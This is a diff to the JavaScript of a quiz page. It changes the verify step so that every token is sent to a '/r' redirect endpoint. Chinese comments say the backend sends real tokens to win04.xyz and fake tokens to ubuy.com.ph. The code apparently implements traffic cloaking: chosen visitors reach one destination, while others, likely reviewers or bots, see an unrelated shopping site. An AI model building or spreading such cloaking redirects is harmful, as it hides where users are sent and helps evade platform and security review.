@@ -388,12 +388,11 @@
       })
       .then(resp => resp.json())
       .then(data => {
-        if (data && data.token && data.pass === true) {
-          // 显示跳转遮罩，然后跳转
+        if (data && data.token) {
+          // 不管 pass/fail 都 redirect 到 /r
+          // 后端 /r 端点统一处理：真 token → win04.xyz，fake token → ubuy.com.ph
           const msg = document.getElementById('redirect-msg');
           if (msg) msg.classList.remove('hidden');
-          // Redirect timeout: if CF blocks navigation, overlay would be permanent
-          // After 3s if still on same page, hide overlay and let user retry
           const redirectTimer = setTimeout(() => {
             if (window.location.pathname === '/quiz') {
               msg.classList.add('hidden');
@@ -404,10 +403,9 @@
           }, 3000);
           window.location.href = '/r?token=' + encodeURIComponent(data.token);
         } else {
-          // pass=false 或异常：留在答题页
           btn.disabled = false;
           btn.textContent = I18N[getLang()].submitBtn;
-          console.log('[quiz] verify fail, staying on page');
+          console.log('[quiz] verify error, staying on page');
         }
       })
       .catch(err => {
